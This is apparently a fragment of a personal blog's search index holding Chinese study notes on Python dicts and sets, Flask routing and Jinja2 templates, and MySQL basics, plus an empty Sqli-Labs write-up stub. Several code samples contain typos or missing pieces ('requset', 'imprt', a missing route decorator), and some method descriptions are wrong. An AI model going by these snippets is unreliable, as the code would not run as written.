python">emptyDict = <span class="hljs-built_in">dict</span>()<br></code></pre></td></tr></table></figure><h2 id="访问字典中的值"><a href="#访问字典中的值" class="headerlink" title="访问字典中的值"></a>访问字典中的值</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs python">tinydict = &#123;<span class="hljs-string">&#x27;Name&#x27;</span>: <span class="hljs-string">&#x27;Runoob&#x27;</span>, <span class="hljs-string">&#x27;Age&#x27;</span>: <span class="hljs-number">7</span>, <span class="hljs-string">&#x27;Class&#x27;</span>: <span class="hljs-string">&#x27;First&#x27;</span>&#125;<br> <br><span class="hljs-built_in">print</span> (<span class="hljs-string">&quot;tinydict[&#x27;Name&#x27;]: &quot;</span>, tinydict[<span class="hljs-string">&#x27;Name&#x27;</span>])<br><span class="hljs-built_in">print</span> (<span class="hljs-string">&quot;tinydict[&#x27;Age&#x27;]: &quot;</span>, tinydict[<span class="hljs-string">&#x27;Age&#x27;</span>])<br></code></pre></td></tr></table></figure><h2 id="修改字典"><a href="#修改字典" class="headerlink" title="修改字典"></a>修改字典</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs python">tinydict = &#123;<span class="hljs-string">&#x27;Name&#x27;</span>: <span class="hljs-string">&#x27;Runoob&#x27;</span>, <span class="hljs-string">&#x27;Age&#x27;</span>: <span class="hljs-number">7</span>, <span class="hljs-string">&#x27;Class&#x27;</span>: <span class="hljs-string">&#x27;First&#x27;</span>&#125;<br> <br>tinydict[<span class="hljs-string">&#x27;Age&#x27;</span>] = <span class="hljs-number">8</span>               <span class="hljs-comment"># 更新 Age</span><br>tinydict[<span class="hljs-string">&#x27;School&#x27;</span>] = <span class="hljs-string">&quot;菜鸟教程&quot;</span>  <span class="hljs-comment"># 添加信息</span><br></code></pre></td></tr></table></figure><h2 id="删除字典中的元素"><a href="#删除字典中的元素" class="headerlink" title="删除字典中的元素"></a>删除字典中的元素</h2><ul><li>使用del 语句删除字典</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># 删除键‘Name’</span><br><span class="hljs-keyword">del</span> qweDict[<span class="hljs-string">&#x27;Name&#x27;</span>]<br><span class="hljs-comment"># 删除整个字典</span><br><span class="hljs-keyword">del</span> qweDict<br></code></pre></td></tr></table></figure><blockquote><p>del 删除后整个字典不再存在</p></blockquote><ul><li>清空字典</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python">qweDict.clear()<br></code></pre></td></tr></table></figure><h2 id="字典键的特性"><a href="#字典键的特性" class="headerlink" title="字典键的特性"></a>字典键的特性</h2><ul><li>不允许同一个键出现两次，创建时同一个键如果被赋值两次，后一个值会被记住</li><li>键必须不可变，所以可以用数字，字符串或元组充当，而列表就不行</li></ul><h2 id="字典内置函数-方法"><a href="#字典内置函数-方法" class="headerlink" title="字典内置函数&amp;方法"></a>字典内置函数&amp;方法</h2><ul><li>python字典包含以下内置函数</li></ul><table><thead><tr><th>函数</th><th>描述</th></tr></thead><tbody><tr><td>len()</td><td>计算元素个数</td></tr><tr><td>str()</td><td>输出字典</td></tr><tr><td>type()</td><td>返回输入的变量类型，如果变量是字典，就返回字典类型</td></tr></tbody></table><ul><li>python字典包含以下内置方法</li></ul><table><thead><tr><th>方法</th><th>描述</th></tr></thead><tbody><tr><td>dict.clear()</td><td>删除字典内所有元素</td></tr><tr><td>dict.copy()</td><td>返回一个字典的浅复制</td></tr><tr><td>dict.formkeys()</td><td>创建一个新的字典，以序列seq中元素做字典的键，val为字典所有键对应的初始值</td></tr><tr><td>dict.get(key, default&#x3D;None)</td><td>返回执行键的值，如果键不在字典中返回default 设置的默认值</td></tr><tr><td>key in dict</td><td>如果键在字典返回true，否返回false</td></tr><tr><td>dict.items()</td><td>以列表返回一个试图对象</td></tr><tr><td>dict.keys()</td><td>返回一个试图对象</td></tr><tr><td>dict.setdefault(key,dafault&#x3D;None)</td><td>和get()类似，但如果键不在字典中，将回添加键并将值设为default</td></tr><tr><td>dict.update(dict2)</td><td>把字典dict2的键值对更新到dict中</td></tr><tr><td>dict.values()</td><td>返回一个试图对象</td></tr><tr><td>dict.pop(key)</td><td>删除字典key所对应的值，并返回被删除的值</td></tr><tr><td>dict.popitem()</td><td>返回并删除字典中最后一对键和值</td></tr></tbody></table><h1 id="集合（Set）"><a href="#集合（Set）" class="headerlink" title="集合（Set）"></a>集合（Set）</h1><blockquote><p>集合是一个无序的不重复的元素序列</p><p>集合中的元素不会重复，并且可以进行交集，并集，差集等常见的集合操作</p><p>可以使用花括号{}创建集合，元素之间用逗号，分隔，或者也可以使用set()函数创建</p></blockquote><p>eg：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs python">set1 = &#123;<span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-number">3</span>,<span class="hljs-number">4</span>&#125;<br>set2 = <span class="hljs-built_in">set</span>([<span class="hljs-number">5</span>,<span class="hljs-number">6</span>,<span class="hljs-number">7</span>])<br></code></pre></td></tr></table></figure><blockquote><p>注意：创建空集合时必须用set()函数，因为 {} 用来创建一个空字典</p></blockquote><h2 id="集合内置方法整合表"><a href="#集合内置方法整合表" class="headerlink" title="集合内置方法整合表"></a>集合内置方法整合表</h2><table><thead><tr><th>方法</th><th>描述</th></tr></thead><tbody><tr><td>add()</td><td>为集合添加元素</td></tr><tr><td>clear()</td><td>移除集合中的所有元素</td></tr><tr><td>copy()</td><td>拷贝多个集合的差集</td></tr><tr><td>difference()</td><td>返回多个集合的差集</td></tr><tr><td>difference_update()</td><td>移除集合中的元素，该元素在指定的集合中也存在</td></tr><tr><td>discard()</td><td>删除集合中指定的元素</td></tr><tr><td>intersection()</td><td>返回集合的交集</td></tr><tr><td>intersection_update()</td><td>返回集合的交集</td></tr><tr><td>isdisjoint()</td><td>判断两个集合是否包含相同的元素，如果没有返回 True，否则返回False</td></tr><tr><td>issubset()</td><td>判断指定集合是否为该方法参数集合的子集</td></tr><tr><td>issuperset()</td><td>判断该方法的参数集合是否为指定集合的子集</td></tr><tr><td>pop()</td><td>随机移除元素</td></tr><tr><td>remove()</td><td>移除指定元素</td></tr><tr><td>symmetric_difference()</td><td>返回两个集合中不重复的元素集合</td></tr><tr><td>sysmmetric_difference_update()</td><td>移除当前集合中在另外一个指定集合中相同的元素，并将另外一个指定集合中不同的元素插入到当前集合中</td></tr><tr><td>union()</td><td>返回两个集合的并集</td></tr><tr><td>update()</td><td>给集合添加元素</td></tr><tr><td>len()</td><td>计算集合元素的个数</td></tr></tbody></table>]]></content>
      
      
      
        <tags>
            
            <tag> Python </tag>
            
            <tag> 开发 </tag>
            
            <tag> 数据结构 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Python开发-Flask框架</title>
      <link href="/posts/483d9cef/"/>
      <url>/posts/483d9cef/</url>
      
        <content type="html"><![CDATA[<h1 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h1><blockquote><p>pip install flask</p></blockquote><h1 id="基础入门"><a href="#基础入门" class="headerlink" title="基础入门"></a>基础入门</h1><ul><li>实例化一个Flask对象，创建一个路由，实现一个基本的页面</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> flask <span class="hljs-keyword">import</span> Flask<br>app = Flask(__name__)<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">index</span>():<br>    <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;Hello world&quot;</span><br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&quot;__main__&quot;</span>: <br>    <span class="hljs-comment">#当py文件被执行时，if下面的代码块将被运行</span><br>    <span class="hljs-comment">#当py文件以模块形式被导入时，下面的代码块不被运行</span><br>    app.debug = <span class="hljs-literal">True</span>   <span class="hljs-comment">#开启调试模式，修改完代码之后不必重启程序</span><br>    app.run()<br></code></pre></td></tr></table></figure><p>route 之后的字符串表示拼接到 <code>localhost:5000</code> 后面的参数</p><p>&lt;&gt; 之中的传参可以带入到页面当中</p><ul><li>指定一个路由</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/name/&lt;name&gt;&#x27;</span>,methods=[<span class="hljs-string">&#x27;GET&#x27;</span>,<span class="hljs-string">&#x27;POST&#x27;</span>]</span>)</span><br><span class="hljs-comment">#method 指定传参方式 POST或者GET方式</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">putName</span>(<span class="hljs-params">name</span>):<br>  <span class="hljs-keyword">return</span> <span class="hljs-string">f&#x27;Hello <span class="hljs-subst">&#123;name&#125;</span>&#x27;</span><br></code></pre></td></tr></table></figure><h2 id="HTTP方法"><a href="#HTTP方法" class="headerlink" title="HTTP方法"></a>HTTP方法</h2><ul><li>首先引入 request</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> flask <span class="hljs-keyword">import</span> Flask,request<br></code></pre></td></tr></table></figure><ul><li>GET 方式接受传参</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python">request.args.get(<span class="hljs-string">&#x27;传参变量名&#x27;</span>)<br></code></pre></td></tr></table></figure><ul><li>POST 方式接受传参</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python">request.form(<span class="hljs-string">&#x27;传参变量名&#x27;</span>)<br></code></pre></td></tr></table></figure><p>eg：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/method&#x27;</span>,methods=[<span class="hljs-string">&#x27;GET&#x27;</span>,<span class="hljs-string">&#x27;POST&#x27;</span>]</span>) </span><br><span class="hljs-comment"># methods 表示可以接受的传参方式</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">method</span>():<br><span class="hljs-keyword">if</span> request.method == <span class="hljs-string">&#x27;GET&#x27;</span>:<br>        name = requset.args.get(<span class="hljs-string">&#x27;name&#x27;</span>)<br><span class="hljs-keyword">return</span> <span class="hljs-string">&quot;GET !!!&quot;</span> + name<br><span class="hljs-keyword">elif</span> request.method == <span class="hljs-string">&#x27;POST&#x27;</span>:<br>        name = request.form[<span class="hljs-string">&#x27;name&#x27;</span>]<br><span class="hljs-keyword">return</span> <span class="hljs-string">&quot;POST !!!&quot;</span> + name<br></code></pre></td></tr></table></figure><h1 id="redirect-重定向"><a href="#redirect-重定向" class="headerlink" title="redirect 重定向"></a>redirect 重定向</h1><ul><li>引入 redirect 和 url_for</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> flask imprt Flask,request,redirect,url_for<br></code></pre></td></tr></table></figure><p>eg:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/login&#x27;</span>,method=[<span class="hljs-string">&#x27;GET&#x27;</span>]</span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">login</span>():<br>key = <span class="hljs-string">&quot;123456&quot;</span><br>UserKey = request.args.get(<span class="hljs-string">&#x27;key&#x27;</span>)<br><span class="hljs-keyword">if</span> UserKey == key:<br><span class="hljs-keyword">return</span> redirect(url_for(<span class="hljs-string">&#x27;login_ed&#x27;</span>))<br><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/login_ed&#x27;</span>,method=[<span class="hljs-string">&#x27;GET&#x27;</span>]</span>)</span><br><span class="hljs-comment">#定义一个新的页面</span><br></code></pre></td></tr></table></figure><h1 id="模板渲染"><a href="#模板渲染" class="headerlink" title="模板渲染"></a>模板渲染</h1><ul><li>首先在项目目录下建一个  <code>template</code> 文件夹，建立 html文件</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs jinja2">&lt;!DOCTYPE html&gt;<br>&lt;html lang=&quot;en&quot;&gt;<br>&lt;head&gt;<br>    &lt;meta charset=&quot;UTF-8&quot;&gt;<br>    &lt;meta name=&quot;viewport&quot; content=&quot;width=device-width, initial-scale=1.0&quot;&gt;<br>    &lt;title&gt;Document&lt;/title&gt;<br>&lt;/head&gt;<br>&lt;body&gt;<br>    &lt;h1&gt;Hello &#123;&#123;name&#125;&#125;&lt;/h1&gt;<br>&lt;/body&gt;<br>&lt;/html&gt;<br></code></pre></td></tr></table></figure><ul><li>渲染 index.html 的同时 向文件传参 将name变量渲染</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> flask <span class="hljs-keyword">import</span> Flask,render_template<br><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/name/&lt;name&gt;&#x27;</span></span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">name</span>(<span class="hljs-params">name</span>):<br>  <span class="hljs-keyword">return</span> render_template(<span class="hljs-string">&#x27;index.html&#x27;</span>,name=name)<br><br></code></pre></td></tr></table></figure><h2 id="模板继承"><a href="#模板继承" class="headerlink" title="模板继承"></a>模板继承</h2><ul><li>编写base页面</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs jinja2">&lt;!DOCTYPE html&gt;<br>&lt;html lang=&quot;en&quot;&gt;<br>&lt;head&gt;<br>    &lt;meta charset=&quot;UTF-8&quot;&gt;<br>    &lt;meta name=&quot;viewport&quot; content=&quot;width=device-width, initial-scale=1.0&quot;&gt;<br>    &lt;title&gt;&#123;% block title %&#125;BasePage&#123;% endblock %&#125;&lt;/title&gt;<br>&lt;/head&gt;<br>&lt;body&gt;<br>    &#123;% block content %&#125;main&#123;% endblock %&#125;<br>    homepage<br>&lt;/body&gt;<br>&lt;/html&gt;<br></code></pre></td></tr></table></figure><ul><li>编写 test1.html</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs jinja2">&#123;% extends &quot;base.html&quot; %&#125;<br><br>&#123;% block title %&#125;Home Page&#123;% endblock %&#125;<br><br>&#123;% block content %&#125;<br>&lt;h2&gt;Welcome to the Home Page!&lt;/h2&gt;<br>&lt;p&gt;Hello &#123;&#123;name&#125;&#125;&lt;/p&gt;<br>&#123;% endblock %&#125;<br></code></pre></td></tr></table></figure><h2 id="控制结构"><a href="#控制结构" class="headerlink" title="控制结构"></a>控制结构</h2><ul><li>分支结构</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs jinja2">&#123;% if name == &quot;Lixiney&quot; %&#125;<br>&lt;p&gt;Hello admin&lt;/p&gt;<br>&#123;% else %&#125;<br>&lt;p&gt;Hello &#123;&#123;name&#125;&#125;&lt;/p&gt;<br>&#123;% endif %&#125;<br></code></pre></td></tr></table></figure><ul><li>循环结构</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs jinja2">&#123;% for person in name %&#125;<br>&lt;p&gt;&#123;&#123;person&#125;&#125;&lt;/p&gt;&lt;br&gt;<br>&#123;% endfor %&#125;<br></code></pre></td></tr></table></figure><h2 id="过滤器"><a href="#过滤器" class="headerlink" title="过滤器"></a>过滤器</h2><blockquote><p>过滤器用于在模板中格式化和处理变量数据</p></blockquote><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs jinja2">&lt;p&gt;&#123;&#123; name|capitalize &#125;&#125;&lt;/p&gt;<br>&lt;p&gt;&#123;&#123; price|round(2) &#125;&#125;&lt;/p&gt;<br></code></pre></td></tr></table></figure><figure class="highlight plaintext"><figcaption><span>name|capitalize &#125;&#125;``` 将 name 变量的值首字母大写</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs &#123;&#123;"><br>```&#123;&#123; price|round(2) &#125;&#125;``` 将 price 变量的值四舍五入到小数点后两位<br><br><br><br>## 宏和模板包含<br><br>&gt; 在一个模板中插入另一个模板的内容<br><br>* 创建宏<br><br>创建 templates/macos.html<br><br>```jinja2<br>&#123;% macro render_item(item) %&#125;<br>    &lt;div&gt;<br>        &lt;h3&gt;&#123;&#123; item.title &#125;&#125;&lt;/h3&gt;<br>        &lt;p&gt;&#123;&#123; item.description &#125;&#125;&lt;/p&gt;<br>    &lt;/div&gt;<br>&#123;% endmacro %&#125;<br></code></pre></td></tr></table></figure><ul><li>使用宏</li></ul><p>创建 templates&#x2F;index.html</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs jinja2">&#123;% from &quot;macros.html&quot; import render_item %&#125;<br><br>&lt;h1&gt;Items&lt;/h1&gt;<br>&#123;% for item in items %&#125;<br>    &#123;&#123; render_item(item) &#125;&#125;<br>&#123;% endfor %&#125;<br></code></pre></td></tr></table></figure><h2 id="安全性"><a href="#安全性" class="headerlink" title="安全性"></a>安全性</h2><blockquote><p>用户输入的内容会被自动转义，以避免恶意代码注入</p></blockquote><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs jinja2">&lt;p&gt;&#123;&#123; user_input &#125;&#125;&lt;/p&gt;<br></code></pre></td></tr></table></figure><h2 id="模板上下文"><a href="#模板上下文" class="headerlink" title="模板上下文"></a>模板上下文</h2><ul><li>传入一个字典类型</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/profile/&lt;username&gt;&#x27;</span></span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">profile</span>(<span class="hljs-params">username</span>):<br>    user = &#123;<span class="hljs-string">&#x27;name&#x27;</span>: username, <span class="hljs-string">&#x27;age&#x27;</span>: <span class="hljs-number">25</span>&#125;<br>    <span class="hljs-keyword">return</span> render_template(<span class="hljs-string">&#x27;profile.html&#x27;</span>, user=user)<br></code></pre></td></tr></table></figure><ul><li>引用方法</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs jinja2">&lt;h1&gt;&#123;&#123; user.name &#125;&#125;&lt;/h1&gt;<br>&lt;p&gt;Age: &#123;&#123; user.age &#125;&#125;&lt;/p&gt;<br></code></pre></td></tr></table></figure><h1 id="表单处理"><a href="#表单处理" class="headerlink" title="表单处理"></a>表单处理</h1>]]></content>
      
      
      <categories>
          
          <category> 开发 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Python </tag>
            
            <tag> Flask </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Sqli-Labs 通关文档</title>
      <link href="/posts/879a70bf/"/>
      <url>/posts/879a70bf/</url>
      
        <content type="html"><![CDATA[<h1 id="Less-01"><a href="#Less-01" class="headerlink" title="Less-01"></a>Less-01</h1><p>等有时间再写。。。</p>]]></content>
      
      
      <categories>
          
          <category> WriteUp </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 网络安全 </tag>
            
            <tag> SQL注入 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Mysql增删改查基础</title>
      <link href="/posts/b710732f/"/>
      <url>/posts/b710732f/</url>
      
        <content type="html"><![CDATA[<h3 id="首先启动数据库"><a href="#首先启动数据库" class="headerlink" title="首先启动数据库"></a>首先启动数据库</h3><ul><li>Linux :</li></ul><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql">sudo systemctl <span class="hljs-keyword">start</span> mysql<br></code></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">mysql -h 数据库地址 -u 用户名 -p 密码<br></code></pre></td></tr></table></figure><ul><li>windows：<ul><li>进入mysql 目录下的 bin 目录，打开cmd</li></ul></li></ul><h3 id="查看数据库"><a href="#查看数据库" class="headerlink" title="查看数据库"></a>查看数据库</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">show</span> databases;<br></code></pre></td></tr></table></figure><h3 id="选择数据库"><a href="#选择数据库" class="headerlink" title="选择数据库"></a>选择数据库</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql">use [数据库名];<br></code></pre></td></tr></table></figure><h3 id="查看数据表"><a href="#查看数据表" class="headerlink" title="查看数据表"></a>查看数据表</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">show</span> tables;<br></code></pre></td></tr></table></figure><h3 id="查看表结构"><a href="#查看表结构" class="headerlink" title="查看表结构"></a>查看表结构</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">desc</span> [数据表名];<br></code></pre></td></tr></table></figure><h2 id="增"><a href="#增" class="headerlink" title="增"></a>增</h2><h3 id="创建一个数据库"><a href="#创建一个数据库" class="headerlink" title="创建一个数据库"></a>创建一个数据库</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">create</span> database [数据库名];<br></code></pre></td></tr></table></figure><h3 id="创建一个数据表"><a href="#创建一个数据表" class="headerlink" title="创建一个数据表"></a>创建一个数据表</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">create table</span> [数据表名] (<br>    字段名<span class="hljs-number">1</span> 字段类型，<br>    字段名<span class="hljs-number">2</span> 字段类型<br>);<br></code></pre></td></tr></table></figure><p>eg:</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">create table</span> <span class="hljs-keyword">user</span> (<br>    id <span class="hljs-type">int</span>(<span class="hljs-number">20</span>),<br>    name <span class="hljs-type">varchar</span>(<span class="hljs-number">255</span>),<br>    password <span class="hljs-type">varchar</span>(<span class="hljs-number">255</span>)<br>);<br></code></pre></td></tr></table></figure><h3 id="增加数据"><a href="#增加数据" class="headerlink" title="增加数据"></a>增加数据</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">insert</span> aaa <span class="hljs-keyword">values</span> (值<span class="hljs-number">1</span>,值<span class="hljs-number">2.</span>..);<br></code></pre></td></tr></table></figure><p>注意 插入的字段数必须和表结构中原有的字段数相同</p><p>方法2：指定字段添加数据</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">insert</span> aaa (字段<span class="hljs-number">1</span>,字段<span class="hljs-number">2</span>) <span class="hljs-keyword">values</span> (值<span class="hljs-number">1</span>,值<span class="hljs-number">2</span>);<br></code></pre></td></tr></table></figure><p>注意：值如果是整型不用加引号，如果是字符串必须加引号</p><h2 id="删"><a href="#删" class="headerlink" title="删"></a>删</h2><h3 id="删除数据库"><a href="#删除数据库" class="headerlink" title="删除数据库"></a>删除数据库</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">drop</span> database [数据库名];<br></code></pre></td></tr></table></figure><h3 id="删除数据表"><a href="#删除数据表" class="headerlink" title="删除数据表"></a>删除数据表</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">drop</span> <span class="hljs-keyword">table</span> [数据表名];<br></code></pre></td></tr></table></figure><h3 id="删除数据"><a href="#删除数据" class="headerlink" title="删除数据"></a>删除数据</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">delete</span> <span class="hljs-keyword">from</span> [表名] <span class="hljs-keyword">where</span> 条件<br></code></pre></td></tr></table></figure><h2 id="改"><a href="#改" class="headerlink" title="改"></a>改</h2><h3 id="更新数据"><a href="#更新数据" class="headerlink" title="更新数据"></a>更新数据</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">update</span> 表名<br><span class="hljs-keyword">set</span> 字段名<span class="hljs-number">1</span> <span class="hljs-operator">=</span> 字段值<span class="hljs-number">1</span> ， [字段名<span class="hljs-number">2</span> <span class="hljs-operator">=</span> 字段值<span class="hljs-number">2</span>]；<br><span class="hljs-keyword">where</span> 条件语句；<br># <span class="hljs-keyword">where</span> <span class="hljs-operator">+</span> 条件 更新部分数据 <span class="hljs-operator">||</span> 不加<span class="hljs-keyword">where</span>子句更新全部数据<br></code></pre></td></tr></table></figure><h2 id="查"><a href="#查" class="headerlink" title="查"></a>查</h2><h3 id="普通查询"><a href="#普通查询" class="headerlink" title="普通查询"></a>普通查询</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">select</span> [字段] <span class="hljs-keyword">from</span> [表] <span class="hljs-keyword">where</span> 条件<br></code></pre></td></tr></table></figure><h3 id="子查询"><a href="#子查询" class="headerlink" title="子查询"></a>子查询</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">select</span> [字段] <span class="hljs-keyword">from</span> [表] <span class="hljs-keyword">where</span> [字段] <span class="hljs-operator">=</span> (<span class="hljs-keyword">select</span> [字段] <span class="hljs-keyword">from</span> [表] <span class="hljs-keyword">where</span> [条件])<br></code></pre></td></tr></table></figure><p>eg:</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs 